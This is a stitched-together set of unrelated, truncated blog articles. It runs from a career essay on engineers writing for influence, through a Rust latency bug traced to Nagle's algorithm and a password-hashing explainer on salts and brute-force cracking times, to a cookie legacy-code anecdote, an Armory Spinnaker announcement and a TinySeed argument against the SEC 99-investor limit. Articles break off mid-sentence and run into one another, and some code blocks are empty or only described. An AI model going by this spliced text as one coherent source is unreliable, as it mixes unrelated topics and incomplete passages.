<p>“Every time you find yourself following the manual instead of writing the manual, you’re avoiding the anguish and giving in to the resistance.” - <a href="https://www.amazon.com/dp/B00371V91S/ref=dp-kindle-redirect?_encoding=UTF8&amp;btkr=1">Seth Godin, Linchpin</a></p>
</blockquote>
<p>Most software engineers live in this zone. Organizational Teachers write documentation, technical specifications, style guides, testing criteria, bug reports, and internal knowledge base articles. While this gives you a little influence over how your team (and possibly some adjacent teams) does its job, it’s unlikely that anyone outside your company will hear about your work.</p>
<p>The good thing about being in this zone is that it’s a safe place to practice. Nobody’s going to berate you for your typos (at least, I hope not), and other stakeholders will review most of your writing before it’s made generally available.</p>
<p>The downside to being an Organizational Teacher is that it’s pretty much table stakes for senior engineers. You’re not going to stand out for it, and you probably won’t get your name attached to it (unless it’s buried in your commit history). Hone your writing skills as an Organizational Teacher, and once you feel more comfortable, move up the ladder.</p>
<h3 id="3-organizational-influencer">3. Organizational Influencer</h3>
<p>As you move into an (official or unofficial) leadership role, you’ll start to do more writing at the Organizational Influencer level. This writing includes setting hiring criteria, documenting tradeoffs between complex technical decisions, creating training materials, and setting budgets. These documents will be seen by people above and below your station and will help get you noticed for future promotions.</p>
<p>Many software developers assume that they <em>should not</em> attempt to contribute this kind of writing unless asked. This is incorrect.</p>
<p>For example, if you’re given a new project, you have a professional obligation to report shortcomings in the design. When you report these issues, don’t just write a Slack message, “This won’t work.” <a href="https://melsatar.blog/2017/09/23/trade-off-analysis-technique-make-the-decision-easier/">Document the tradeoffs</a> between the proposed solution and one that you’ve seen work elsewhere. Most people don’t do this because it’s hard, and that’s why they don’t have much influence.</p>
<p>Organizational Influencers are helping set the direction for at least a small part of the business, and they’ll end up doing more writing than those at the previous two levels. Software developers who make it to this level will be eligible for more internal promotions, interesting lateral moves, and a general increase in respect. Organizational Influencers will also start to gain the confidence to start writing externally.</p>
<h3 id="4-external-teacher">4. External Teacher</h3>
<blockquote>
<p>“Writing is hard. People spend their entire lives learning how to write effectively. It isn’t something you can fake. It isn’t something you can buy. You have to work at it.
That’s exactly why people who are afraid they can’t write should be blogging. It’s exercise.” - <a href="https://blog.codinghorror.com/fear-of-writing/">Jeff Atwood</a>, Co-founder of StackOverflow</p>
</blockquote>
<p>Despite the prevalence of <a href="https://medium.com/">Medium</a> and <a href="http://dev.to/">Dev.to</a>, surprisingly few software engineers ever write publicly. External Teachers generally start by writing technical case studies, public documentation, and walkthroughs. This is where software developers can begin to publicly display their knowledge and build a personal brand.</p>
<p>I’ll put a big caveat here and say that writing a few tutorials will not immediately make employers hunt you down. I’ve written dozens of technical tutorials over the years, and only a couple of them led directly to an employment discussion (neither of which worked out). Writing publicly is the first step in building a reputation, but more importantly, it gives you a great resource to point to when an employer asks you about a specific technical experience you’ve had.</p>
<p>The hard part about becoming an External Teacher is that it’s scary, and you’re likely to suck at first. People <a href="https://medium.com/@cinzia.dubois/the-importance-of-doing-things-youre-bad-at-4fcdd4c2fb4b">naturally avoid doing things they’re bad at</a>, but doing scary things is an essential part of gaining influence.</p>
<p>If you overcome the fear of writing publicly and you start to tell people about your writing, you’ll probably be surprised by the encouragement you get. People will root for you when you do something they’re scared to do themselves.</p>
<h3 id="5-external-influencer">5. External Influencer</h3>
<p>So few people achieve the level of External Influencer that just attempting this sort of writing puts you in a tiny, standout class of people. Unlike the External Teacher, who sticks to irrefutable facts and rehashes of existing knowledge, the External Influencer has a strong point of view. They write from deep experience, and their writing influences the decisions that others make.</p>
<p>Some of the External Influencers you’ve probably heard of include <a href="https://martinfowler.com/">Martin Fowler</a>, <a href="http://cleancoder.com/products">“Uncle” Bob Martin</a>, and <a href="https://domainlanguage.com/">Eric Evans</a>. When they write something, thousands of programmers listen, and their books have shaped decades of software architecture.</p>
<p>There are degrees to all the influence levels in this model. You don’t have to be Uncle Bob to be an External Influencer; you just need to start applying your technical experience to larger business challenges in a public forum. For example, Eric Evans created Domain-Driven Design to help businesses build better software by making it more closely resemble the underlying domain model. If you’ve spent years solving a particular set of problems, you probably have at least a few issues you could get on a soapbox about. These are likely your platform for becoming an External Influencer.</p>
<p>While it sounds great, acting like an External Influencer is even scarier than being an External Teacher. Not only does your writing have to be factually accurate and coherent, but you’re also opening your ideas to public criticism. Nobody likes to get slammed on the internet, but the upside can be huge if your work is well-received. Do you think Martin Fowler would ever have trouble getting a job if he decided to leave ThoughtWorks? I’m pretty sure he could (literally) write his own job description just about anywhere.</p>
<h2 id="write-above-your-level">Write Above Your Level</h2>
<p>By this point, I hope I’ve convinced you that influence is an important part of advancing your software development career and that writing can help you gain this influence. My final encouragement to engineers who want to become better writers is to push beyond your current level. It will be uncomfortable, but it’s also one of the best ways to take control of your career. <a href="https://twitter.com/karllhughes">Let me know if I can help</a>.</p>

<p>This is a small story about tracking down a production bug in a Rust
application. I don’t know if there’s any take away from this one for the reader,
but it felt interesting so I’m sharing it.</p>

<h2 id="a-bit-of-backstory">A bit of backstory</h2>

<p>In Avast, we have a Rust application called <a href="https://vorner.github.io/2019/05/19/rust-in-avast.html">urlite</a>. It serves as a backend to
some other applications, provides them a HTTP API. It’s in Rust because it is
latency critical. Latencies of most requests are under a millisecond.</p>

<p>It was written with <a href="https://docs.rs/tokio/0.1.*"><code>tokio-0.1</code></a> and <a href="https://docs.rs/hyper/0.12.*"><code>hyper-0.12</code></a> to deal with the HTTP. We
were quite late to update to newer versions, in part because it worked fine and
the amount of <code>async</code> code was single quite short function, so we didn’t have
much motivation. And in part because we use the <a href="https://crates.io/crates/spirit"><code>spirit</code></a> libraries for
configuration. It’s a library to take configuration and set up the internal
state of the program for it ‒ configuration contains the ports to listen to,
etc, and it manages spawning the HTTP server objects inside the program and can
even migrate from one set of ports to other at runtime.</p>

<p>But migrating <a href="https://crates.io/crates/spirit"><code>spirit</code></a> to newer <code>tokio</code> and <code>hyper</code> was a big task (because
the API surface is quite large, the library does a bit unusual things compared
to all the usual applications and the change between old and new <code>tokio</code> was
quite large).</p>

<p>Anyway, eventually I got permission to work on the migration of <a href="https://crates.io/crates/spirit"><code>spirit</code></a> as
part of my job. It took about a week to migrate both <a href="https://crates.io/crates/spirit"><code>spirit</code></a> and <a href="https://vorner.github.io/2019/05/19/rust-in-avast.html">urlite</a>. It
went through review, went through the automatic tests and we put it to the
staging environment for a while, watching the logs and graphs. Everything seemed
fine, so after few days of everything looking fine, we pushed the button and put
it to production.</p>

<h2 id="the-increased-latencies">The increased latencies</h2>

<p>As it goes in these kinds of stories, by now you’re expecting to see what went
wrong.</p>

<p>The thing is, our own metrics and graphs were fine. But the latency on the
downstream service querying us increased by 40ms. The deployment got reverted,
and we started to dig into where these latencies come from.</p>

<h2 id="it-was-acting-really-weird">It was acting really weird</h2>

<p>There were several very suspicious things about that.</p>

<ul>
  <li>Our own „internal“ latencies stayed the same. Our CPU usage also stayed the
same.</li>
  <li>The latency graph on the downstream side was flat 40ms <em>constant</em>.</li>
</ul>

<p>Now, if we introduced some performance regression in the query handling, we
would expect our CPU consumption to rise. We would also expect the latency graph
to be a bit spiky, not completely flat 40ms constant. It almost looked like
there was a 40ms <code>sleep</code> somewhere. But why would anyone put a 40ms sleep
anywhere?</p>

<p>I’ve looked through documentation and didn’t see anything obvious. I’ve tried
searching both our code and code of the dependencies for <code>40</code>, asked on Slack if
that <code>40ms</code> value was familiar to anyone. Nothing.</p>

<p>The working theory we started with was that there could be some kind of back-off
sleep on some kind of failure. Maybe <code>hyper</code> would be closing inactive
connections in the new version, forcing the application to reconnect (the graph
was for 99th percentile, so if we happened to close each 100th connection and
reconnection took this long…) and maybe try IPv6 first and we would be listening
on IPv4 only or… (in other words, we didn’t have a clear clue).</p>

<h2 id="the-benchmarks">The benchmarks</h2>

<p>My colleague started to investigate in a more thorough way than just throwing
ideas around on Slack. He run a <code>wrk</code> benchmark against the service. On his
machine, the latencies were fine. So he commandeered one of the stage nodes to
play with it and run the benchmark there. And every request had 40ms latency on
that machine. The previous version of <code>urlite</code> was fine, with under one
millisecond.</p>

<p><em>Something</em> was probably sleeping somewhere on the production servers, but not
on the development machine. There probably was some difference in the OS
settings, but definitely difference in the kernel version. The servers are
running some well-tried Linux distribution, so they have a lot older version,
while a developer is likely to run something much more on the edge.</p>

<h2 id="configuration-options">Configuration options</h2>

<p>The selling point of <a href="https://crates.io/crates/spirit"><code>spirit</code></a> is that most of the thing one can set in the
builders of various libraries and types now can be just put into a config file
without any recompilation. If we did configuration by hand, we would expose only
the things we thought would be useful, but with spirit, there’s everything. So,
naturally, tweaking some of the config knobs was the next step (because it was
easy to do).</p>

<p>It was discovered that turning the <code>http1-writev</code> option <em>off</em>, which
corresponds to
<a href="https://docs.rs/hyper/0.13.8/hyper/server/struct.Builder.html#method.http1_writev">this method</a>
in <code>hyper</code>, made the latencies go away.</p>

<p>We now had a solution, but I wasn’t happy about not understanding <em>why</em> that
helped, so I went to dig the rabbit hole and find the root cause. Turns out
there were several little things in just the constellation to make the problem
manifest.</p>

<h2 id="overriding-the-defaults-of-http1_writev">Overriding the defaults of <code>http1_writev</code></h2>

<p>The method controls the strategy in which way data are pushed into the socket.
With vectored writes enabled, it sends two separate buffers (one with headers,
the other with the body if it’s small enough) through a single <a href="https://linux.die.net/man/2/writev"><code>writev</code></a>
syscall.  If they are disabled, <code>hyper</code> copies all the bytes into a single
buffer and sends that as a whole.</p>

<p>It turns out that the method takes a <code>bool</code>, but there are actually 3 states.
The third (auto) is signalled by <em>not</em> calling the method and <code>spirit-hyper</code> was
calling it always, with the default to turn the <a href="https://linux.die.net/man/2/writev"><code>writev</code></a> on. I don’t know if
leaving it on auto would make the bug go away, but I’ve fixed the problem in the
library anyway.</p>

<h2 id="splitting-vectored-writes">Splitting vectored writes</h2>

<p>Spirit wants to support a bit of configuration on top of what the underlying
libraries provide on their own. One of such things is limiting the number of
concurrently accepted connections on a single listening socket. Users don’t have
to take advantage of that (the types for the configuration can be composed
together to either contain that bit or not and the administrator may leave the
values for the limits unset in the configuration and then they won’t be
enforced).</p>

<p>Anyway, in case the support for the limits is opted in through using the type
with the configuration fields, the connections themselves are wrapped in a
<a href="https://docs.rs/spirit-tokio/0.7.*/spirit_tokio/net/limits/struct.Tracked.html"><code>Tracked</code></a>
type. The type tries to be mostly transparent for use and can be used inside
<code>hyper</code> (which is what the default configuration type alias in <code>spirit-hyper</code>
does), but tracks how many connections there are, to not accept more if it runs
out of the limit.</p>

<p>When implementing the bunch of traits for the wrapper, I’ve overlooked the
<a href="https://docs.rs/tokio/0.2.*/tokio/io/trait.AsyncWrite.html#method.poll_write_buf"><code>AsyncWrite::poll_write_buff</code></a>.
It is a provided method, which means it has a default implementation. It is the
one that abstracts the OS-level <code>writev</code>, it can write multiple buffers (the
<a href="https://docs.rs/bytes/0.5.*/bytes/buf/trait.Buf.html"><code>Buf</code></a> represents a
segmented buffer).</p>

<p>The default implementation simply delegates to multiple calls to the ordinary
write. Therefore, this omission combined with the default of enabling vectored
writes results in calling into the kernel twice, each time with a small buffer,
instead of once with two small buffers or once with a big buffer.</p>

<p>That was definitely something to get fixed, because if nothing else, syscalls
are expensive and calling more of them is not great. But I’ve finally felt like
I’m on the right path, because:</p>

<h2 id="nagles-algorithm">Nagle’s algorithm</h2>

<p>You probably know that TCP stream is built from packets going there and back.
Optimizing how to split the stream into the packets and when to send them is a
hard problem and the research in that area is still ongoing, because there are
many conflicting requirements. One wants to deliver the data with low latency,
utilize the whole bandwidth, but not overflow the capacity of the link (in which
case the latencies would go up or packets would get lost and would have to be
retransmitted), leave some bandwidth to other connections, etc.</p>

<p>The <a href="https://en.wikipedia.org/wiki/Nagle%27s_algorithm">Nagle’s algorithm</a> is
one of the older tricks up in TCP’s sleeve. The network doesn’t like small
packets.  It is better to send as large packets as the link allows, because each
packet has certain overhead ‒ the headers that take some space, but also routers
spend computation power mostly based on number of packets and less on their
size. If you start sending a lot of tiny packets, the performance will suffer.
While the links are limited by the number of bytes that can pass through them,
routers are more limited by the number of packets. If a router declares to be
able to handle a gigabit connection, it actually means a gigabit <em>if you use
full-sized packets</em>, but will get to few megabits if you split the data into
tiny packets.</p>

<p>So it would be better to wait until the send buffer contains a packetfull of
data before sending anything. But we can’t do that, because we don’t <em>know</em>
there’ll ever be a full packet of data, or generating more data might wait for
the other side to answer. We would never send anything and wait forever and the
Internet would not work.</p>

<p>Instead, the algorithm is willing to send <em>one</em> undersized packet and then it
waits for an <code>ACK</code> from the other side until sending another undersized one. If
it gets a packetfull of data to send in the meantime, that’s great and it sends
it (it won’t get better by waiting longer), but it won’t ever have two
undersized ones somewhere in flight, therefore won’t kill the network’s
performance by them.</p>

<p>This works, it’ll make progress eventually because once the <code>ACK</code> comes and
all the data that accumulated until then is sent.</p>

<p>But it also slows things down. Like in our case. What happens if we do it using
single syscall, the whole HTTP response forms a single undersized packet (we
have really small answers) and gets sent, no matter if it’s submitted to the
kernel by one big or two small buffers.</p>

<p>On the other hand, if we split the submission into two syscalls, this is what
happens:</p>

<ul>
  <li>We write the first part (headers). The kernel sends them out as an undersized
packet.</li>
  <li>We write the second part (the body). But the kernel shelves them into the send
buffer and waits for sending them until it sees the <code>ACK</code>, because there’s one
undersized packet …</li></ul></section></div></div>

              <p>Here’s the reality, billions of credentials have been leaked or stolen and are now easily downloaded online by anyone. Many of these databases of identities include passwords in plain text, while others are one-way hashed. One-way hashing is better (we’ll get to why in a second), but it is only as secure as is mathematically feasible. Let’s take a look at one-way hashing algorithms and how computers handle them.</p>

<h2 id="hashing">Hashing</h2>

<p>A hash by definition is a function that can map data of an arbitrary size to data of a fixed size. SHA2 is a hashing algorithm that uses various bit-wise operations on any number of bytes to produce a fixed sized hash. For example, the SHA-256 algorithm produces a 256 bit result. The algorithm was designed specifically so that going from a hash back to the original bytes is infeasible. Developers use an SHA2 hash so that instead of storing a plain text password, they instead only store the hash. When a user is authenticated, the plain text password they type into the login form is hashed, and because the algorithm will always produce the same hash result given the same input, comparing this hash to the hash in the database tells us the password is correct.</p>

<h2 id="cracking-passwords">Cracking Passwords</h2>

<p>While one-way hashing means we aren’t storing plain text passwords, it is still possible to determine the original plain text password from a hash. Next, we’ll outline the two most common approaches of reversing a hash.</p>

<h3 id="lookup-tables">Lookup Tables</h3>

<p>The first is called a lookup table, or sometimes referred to as a rainbow table. This method builds a massive lookup table that maps hashes to plain text passwords. The table is built by simply hashing every possible password combination and storing it in some type of database or data-structure that allows for quick lookups.</p>

<p>Here’s an example of a lookup table for SHA2 hashed passwords:</p>

<div><div><pre><code><span>sha2_hash                                                          password</span>

</code></pre></div></div>

<p>Using a lookup table, all the attacker needs to know is the SHA2 hash of the password and they can see if it exists in the table. For example, let’s assume for a moment that Netflix stores your password using an SHA2 hash. If Netflix is breached, their user database is likely now available to anyone with a good internet connection and a torrent client. Even a mediocre hacker now only needs to lookup the SHA2 hash associated with your Netflix account to see if it exists in their lookup table. This will reveal nearly instantly what your plain text password is for Netflix. Now, this hacker can log in to your Netflix account and binge watch all four seasons of Fuller House (“how rude!”). And he can also try this password on Hulu and HBO Go to see if you used the same email address and password for those accounts as well.</p>

<p><img src="https://fusionauth.io/assets/img/blogs/salt.png" alt="Salt"></p>

<p>The best way to protect against this type of attack is to use what is called a <strong>salt</strong>. A salt is simply a bunch of random characters that you prepend to the password before it is hashed. Each password should have a different salt, which means that a lookup table is unlikely to have an entry for the combination of the salt and the password. This makes salts an ideal defense against lookup tables.</p>

<p>Here’s an example of a salt and the resulting combination of the password and the salt which is then hashed:</p>

<div><div><pre><code><span>// Bad, no salt. Very bland.</span>
<span>sha2</span><span>(</span><span>"password"</span><span>)</span> <span>// 6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e</span>

<span>// Better, add a salt.</span>
<span>salt</span> <span>=</span> <span>";L'-2!;+=#/5B)40/o-okOw8//3a"</span>
<span>toHash</span> <span>=</span> <span>";L'-2!;+=#/5B)40/o-okOw8//3apassword"</span>
<span>sha2</span><span>(</span><span>toHash</span><span>)</span> <span>// f534e6bf84a638112e07e69861927ab624c0217c0655e4d3be07659bcf6c1c07</span>
</code></pre></div></div>

<p>Now that we have added the salt, the “password” that we actually generated the hash from was the String <code>;L'-2!;+=#/5B)40/o-okOw8//3apassword</code>. This String is long, complex and contains a lot of random characters. Therefore, it is nearly impossible that the hacker that created the lookup table would have generated the hash for the String <code>;L'-2!;+=#/5B)40/o-okOw8//3apassword</code>.</p>

<h3 id="brute-force">Brute Force</h3>

<p><img src="https://fusionauth.io/assets/img/blogs/hulk.png" alt="Brute Force"></p>

<p>The second method that attackers use to crack passwords is called brute force cracking. This means that the attacker writes a computer program that can generate all possible combinations of characters that can be used for a password and then computes the hash for each combination. This program can also take a salt if the password was hashed with a salt. The attacker then runs the program until it generates a hash that is the same as the hash from the database. Here’s a simple Java program for cracking passwords. We left out some detail to keep the code short (such as all the possible password characters), but you get the idea.</p>

<p>This program will generate all the possible passwords with lengths between 6 and 8 characters and then hash each one until it finds a match. This type of brute-force hacking takes time because of the number of possible combinations.</p>

<h2 id="password-complexity-vs-computational-power">Password complexity vs. computational power</h2>

<p>Let’s bust out our TI-85 calculators and see if we can figure out how long this program will take to run. For this example we will assume the passwords can only contain ASCII characters (uppercase, lowercase, digits, punctuation). This set is roughly 100 characters (this is rounded up to make the math easier to read). If we know that there are at least 6 characters and at most 8 characters in a password, then all the possible combinations can be represented by this expression:</p>

<div><div><pre><code>possiblePasswords = 100^8 + 100^7 + 100^6
</code></pre></div></div>

<p>The result of this expression is equal to <code>10,101,000,000,000,000</code>. This is quite a large number, North of 10 quadrillion to be a little more precise, but what does it actually mean when it comes to our cracking program? This depends on the speed of the computer the cracking program is running on and how long it takes the computer to execute the SHA2 algorithm. The algorithm is the key component here because the rest of the program is extremely fast at creating the passwords.</p>

<p>Here’s where things get dicey. If you run a quick Google search for <a href="http://lmgtfy.com/?q=fastest+bitcoin+rig">“fastest bitcoin rig”</a> you’ll see that these machines are rated in terms of the number of hashes they can perform per second. The bigger ones can be rated as high as <code>44 TH/s</code>. That means it can generate 44 tera-hashes per second or <code>44,000,000,000,000</code>.</p>

<p>Now, if we divide the total number of passwords by the number of hashes we can generate per second, we are left with the total time it takes a Bitcoin rig to generate the hashes for all possible passwords. In our example above, this equates to:</p>

<div><div><pre><code>bitcoinRig = 4.4e13
possiblePasswords = 100^8 + 100^7 + 100^6 = 1.0101e16

numberOfSeconds = possiblePasswords / bitcoinRig = ~230
numberOfMinutes = numberOfSeconds / 60 = ~4
</code></pre></div></div>

<p>This means that using this example Bitcoin rig, we could generate all the hashes for a password between 6 and 8 characters in length in roughly 4 minutes. Feeling nervous yet? Let’s add one additional character and see long it takes to hash all possible passwords between 6 and 9 characters.</p>

<div><div><pre><code>bitcoinRig = 4.4e13
possiblePasswords = 100^9 + 100^8 + 100^7 + 100^6 = 1.010101E18

numberOfSeconds = possiblePasswords / bitcoinRig = 22,956
numberOfMinutes = numberOfSeconds / 60 = ~383
numberOfHours = numberOfMinutes / 60 = ~6
</code></pre></div></div>

<p>By adding one additional character to the potential length of the password we increased the total compute time from 4 minutes to 6 hours. This is nearing a 100x increase in computational time to use the brute force strategy. You probably can see where this is going. To defeat the brute force strategy, you simply need to make it improbable to calculate all possible password combinations.</p>

<p>Let’s get crazy and make a jump to 16 characters:</p>

<div><div><pre><code>bitcoinRig = 4.4e13
possiblePasswords = 100^16 + 100^15 ... 100^7 + 100^6 = 1e32

numberOfSeconds = possiblePasswords / bitcoinRig = 2.27e18
numberOfMinutes = numberOfSeconds / 60 = 3.78e16
numberOfHours = numberOfMinutes / 60 = 630,000,000,000,000 or 630 trillion
numberOfDays = numberOfHours / 24 = 26,250,000,000,000 or 26.25 trillion days
numberOfYears = numberOfDays / 365 = 71,917,808,219 or 71.9 billion years
</code></pre></div></div>

<p>To boil down our results, if we take these expressions and simplify them, we can build an equation that solves for any length password.</p>

<div><div><pre><code>numberOfSeconds = 100^lengthOfPassword / computeSpeed
</code></pre></div></div>

<p>This equation shows that as the password length increases, …</p></div></div>

As it tends to do, time continues to move on.  The project and code in
it eventually becomes legacy code (aka, someone else's problem to
maintain).
</p>

<p>
One day, the business drudges up that old automated cookie creation
idea and requests that it handles a new task - "instead of just cooking
peanut butter cookies, it'd be great if the cookie system could handle
oatmeal raisin as well!".
</p>

<p>
Hah!  You remember that old system, but you're onto newer and better
things.  This is a perfect task for the intern to sink their teeth
into - afterall, it's legacy and not high profile, it's been stable,
and it was so simple to implement the first time around.
</p>

<p>
The new set of requirements/recipe the intern works off of looks very
similar to the initial ones:
</p>

<ul>
<li>Step 1: Preheat oven to 325F, grease cookie sheet</li>
<li>Step 2: In bowl, stir oats, pumpkin puree and sugar until smooth.</li>
<li>Step 3: Beat in one egg white, then stir in baking soda, salt, and cinnamon.</li>
<li>Step 4: Roll dough into 1 inch balls and place 2 inches apart on the sheet.</li>
<li>Step 5: Bake for 8 minutes, cool for 5, enjoy!</li>

<p>
The code comes in, the peer reviews pass it as it meets the
requirements and nothing is obviously wrong.  Still, it has become a
bit harder to understand and you're left with a nagging feeling.

                <h2><b>Armory, Spinnaker, and Kubernetes</b></h2>
<p><span>We are excited to announce that Armory now provides a K8s-native continuous delivery experience from end-to-end, unlocking Kubernetes deployments in the enterprise at massive scale. As a cloud-native, multi-cloud CD platform, Spinnaker has always been a powerful tool for deploying to Kubernetes. In fact, AWS and Google engineering teams helped to build the </span><a href="https://www.armory.io/blog/deep-dive-into-clouddriver/"><span>Spinnaker Clouddrivers</span></a><span> for deploying to EKS and GKE, and Spinnaker powers more than </span><b>8 million monthly K8s deployments</b><span>.&nbsp;</span></p>
<p><img loading="lazy" data-src="https://www.armory.io/wp-content/uploads/2020/11/Image-2020-11-16-at-11.09.28-PM-768x410.png" alt="" width="631" height="337" src="https://www.armory.io/wp-content/uploads/2020/11/Image-2020-11-16-at-11.09.28-PM-768x410.png"></p>
<p><em>Monthly OSS Spinnaker deployments to K8s are up 5x since April.</em></p>
<p><span>Armory is enhancing Spinnaker by introducing a familiar Kubernetes workflow, eliminating context-switching and domain-specific languages, and helping Spinnaker scale deployments to thousands of Kubernetes clusters.</span></p>
<h2><b>Day 0: The Armory Operator</b></h2>
<p><span>The </span><a href="https://www.armory.io/blog/announcing-the-spinnaker-kubernetes-operator/"><span>Armory Operator</span></a><span> is a Kubernetes operator for implementing and managing Spinnaker, bringing a Kubernetes-native GitOps workflow to managing Spinnaker’s full lifecycle. With the Operator, you treat Spinnaker as simply another Kubernetes deployment, installing, managing, and upgrading it with familiar tools such as <code>kubectl</code> and <code>kustomize</code>. Install Spinnaker with just a few keystrokes, and upgrade your Spinnaker version simply by changing the version number in a config file and applying. Access to other Kubernetes features, such as Kubernetes Secrets, also comes enabled out of the box.</span></p>
<p><span>The Operator also unlocks the scalability and security of a GitOps workflow by defining all of your Spinnaker configs as code and centralizing them in a single Git repo. This enables collaborative code reviews on all config changes to ensure that Spinnaker is stable and secure. Pre-flight validation of all changes adds a further layer of safety. In the event of a bad update, built-in config version control allows for rapid rollbacks and auditability.</span></p>
<p><span>The Operator is available for both Armory and open source Spinnaker.</span></p>
<h2><b>Building your Deployment Pipelines: PaCRD</b></h2>
<p><a href="https://docs.armory.io/docs/spinnaker-user-guides/pacrd/"><span>PaCRD</span></a><span> (a combination of “</span><a href="https://www.armory.io/armory-enterprise-spinnaker/pipelines-as-code-gitops/"><span>Pipelines as Code</span></a><span>” and “</span><a href="https://kubernetes.io/docs/concepts/extend-kubernetes/api-extension/custom-resources/"><span>Custom Resource Definition</span></a><span>”) is a Kubernetes controller that manages the lifecycle of Spinnaker applications and pipelines as objects within your K8s cluster. PaCRD extends Kubernetes functionality to support Spinnaker Application and Pipeline objects that can be observed for changes through a mature lifecycle management API.</span></p>
<p><span>With PaCRD you can:</span></p>
<ul>
<li><span>Maintain your Spinnaker pipelines as code with the rest of your Kubernetes manifests.</span></li>
<li><span>Persist Pipeline and Application changes with confidence to your Spinnaker cluster.</span></li>
<li><span>Leverage existing tools <code>helm</code> and <code>kustomize</code> to template your pipelines across teams and projects.</span></li>
</ul>
<p><span>Pipelines as Code is one of Armory’s most powerful features. It brings security and repeatability to your application deployments by enabling you to templatize and share pre-blessed pipelines that are up-to-date with your organizational best practices and security &amp; compliance policies. With PaCRD, we are providing another method for accessing those benefits, but with a K8s-native workflow and some additional Kubernetes functionality.</span></p>
<p><span>PaCRD is available as an early release feature with select </span><a href="https://www.armory.io/armory-design-partners/"><span>Armory Design Partners</span></a><span>.&nbsp;</span></p>
<h2><b>Deployment to Production: The Armory Agent for Kubernetes&nbsp;</b></h2>
<p><span>Spinnaker is the tool of choice for hundreds of the world’s leading enterprises to deploy to Kubernetes.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-e7b2ccadd106c01a49f9"><div><h3>The current limit of 99 accredited investors <strong>hurts capital formation</strong>, <strong>reduces investment opportunities</strong>, <strong>increases the risk to individual investors</strong> and <strong>decreases access to private capital markets for underrepresented groups</strong>.</h3><p>At TinySeed, we are in the process of <a href="https://tinyseed.com/latest/invest">raising the second fund</a> for our SaaS accelerator, and we’re often asked why we have such a high minimum investment. If an <a href="https://www.investopedia.com/terms/a/accreditedinvestor.asp">accredited investor</a> wants to put in $50,000, why would we turn them down?&nbsp;</p><p>It all comes down to SEC regulations, which limit funds like ours to a maximum of 99 accredited investors. In order to raise the amount of capital required to execute on <a href="https://tinyseed.com/thesis">our investment thesis</a>, we must enforce a (relatively) high minimum investment.&nbsp;</p><p>We didn’t write this article to complain about our situation, as <a href="https://tinyseed.com/invest">fundraising (even with this minimum in place) is going quite well</a>. But for us, this process has brought to light an unintended consequence of this 99 investor limit.</p><p>Over time, successful venture firms raise larger and larger funds, quickly running into the 99 investor limit, and forcing their investment minimum higher. <strong>These high minimums concentrate this wealth creation opportunity to super high net worth individuals and institutional investors, excluding accredited investors who cannot afford to write such a large check.</strong></p><p>The SEC enforces certain kinds of regulations to provide investor protections against fraud and abuse, which we salute. However, current regulations (and this 99 investor limit) prohibit the average accredited investor from accessing these markets in a meaningful way. This matters because the private markets are a significant driver of wealth creation.</p><p>We fully understand that the SEC needs to have some limit on the number of investors that can invest in a private fund. <strong>However, we believe that the current limit of 99 is the wrong approach.&nbsp;</strong></p><p>We started TinySeed because we wanted to give founders more options for capital to grow their companies, and we feel that as a fund, we can and should also call for change in how sophisticated investors are able to invest their money.<strong><em> </em></strong>Specifically, we believe that successful tech founders and operators should be able to invest into the field they understand best — early stage technology — instead of being limited to real estate or the public markets.</p><p>We believe funds like ours should be able admit up to 1999 accredited investors, assuming they are required to make reasonable efforts to verify that investors are accredited.</p><h3>As the current rules are enshrined in law, we’re exploring ways to bring this issue in front of Congress. <strong>If you are an emerging manager or stakeholder who would like to see the 99 investor limit raised, send us an email at </strong><a href="mailto:hello@tinyseed.com"><strong>hello@tinyseed.com</strong></a><strong>.</strong></h3><p><strong>Please help raise awareness of this issue:</strong></p><ul data-rte-list="default"><li><p><a href="https://twitter.com/intent/tweet?text=The%20SEC%20limit%20of%2099%20investors%20on%20investment%20funds%20over%20%2410m%20has%20significant%20unintended%20consequences.%20Read%20about%20the%20issue%20and%20join%20TinySeed%20in%20support%20to%20change%20the%20law%3A%20https%3A%2F%2Ftinyseed.com%2Flatest%2F99-investor-problem%20">Share on Twitter</a></p></li><li><p><a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Ftinyseed.com%2Flatest%2F99-investor-problem" target="_blank">Share on Facebook</a></p></li><li><p><a href="https://www.linkedin.com/shareArticle?mini=true&amp;source=TinySeed&amp;summary=The%20SEC%20limit%20of%2099%20investors%20on%20investment%20funds%20over%20%2410m%20has%20significant%20unintended%20consequences.%20Read%20about%20the%20issue%20and%20join%20TinySeed%20in%20support%20to%20change%20the%20law%3A%20&amp;title=&amp;url=https%3A%2F%2Ftinyseed.com%2Flatest%2F99-investor-problem">Share on LinkedIn</a></p></li></ul><p>Fund regulations and SEC rules are fairly complicated; read on for our breakdown of what everything means below:<br></p><h2>Current SEC regulatory regime for private funds</h2><h3>3(c)(1) vs. 3(c)(7)</h3><p>The SEC’s regulatory regime currently provides 2 exemptions to the (burdensome and expensive) requirement for a venture fund like ours to be registered with the SEC: 3(c)(1) and 3(c)(7).</p><p>A 3(c)(1) fund may have no more than 99 Accredited Investors, while a 3(c)(7) fund can have up to 1999 investors, but these must all be “Qualified Purchasers”. The qualified purchaser, or QP, definition is a significant increase in the required net worth compared to accredited investors.</p><h3>Why can’t investors pool their money and create a single entity to invest?</h3><p>The SEC stipulates that accredited investors cannot pool their money and create a single entity (for example through an SPV) to invest in the fund – the SEC will “look through” this entity and count the number of investors there as long as the entity was created for the purpose of making a specific investment.&nbsp;</p><h3>Why can’t we create parallel funds?</h3><p>Another often suggested option, to run several parallel funds that co-invest, is also forbidden, as the SEC will count as a single fund, any set of funds that a reasonable investor would deem to be identical.</p><h3>One burdensome option: The “QP sleeve”</h3><p>The only exception to the above is what’s sometimes referred to as a “QP sleeve”. A 3(c)(1) fund may operate in parallel with a separate 3(c)(7) fund. This does add significant overheads, but frees up some slots for accredited investors by moving the qualified purchasers into the 3(c)(7) (of which there can be 1999).</p><h3>The recent JOBS act</h3><p>A more recent change was introduced with the JOBS act, which expanded the ability of fund managers to promote their offerings publicly, with the trade-off that doing so would tighten the requirement to verify that all investors were in fact accredited investors (a 506c offering). We think these changes are laudable, as they increase awareness of specific offerings among accredited investors while also adding further, appropriate, protections.</p><h2>Recent regulatory efforts to expand investment opportunities, harmonize regulations with other jurisdictions and further capital formation</h2><p>&nbsp;The SEC very recently issued updated accredited investor definitions: </p><blockquote><p>For the first time, individuals will be permitted to participate in our private capital markets not only based on their income or net worth, but also based on established, <strong><em>clear measures of financial 